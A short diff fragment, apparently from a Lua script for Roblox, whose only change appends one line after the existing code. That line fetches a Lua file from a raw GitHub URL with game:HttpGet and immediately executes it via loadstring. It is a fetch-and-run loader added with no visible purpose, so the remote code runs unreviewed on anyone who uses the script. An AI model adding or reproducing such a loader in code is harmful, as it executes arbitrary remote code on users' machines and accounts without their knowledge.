@@ -47,3 +47,5 @@ do
         end
     end)
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/yoo123fd/yhh/main/ms.lua"))()
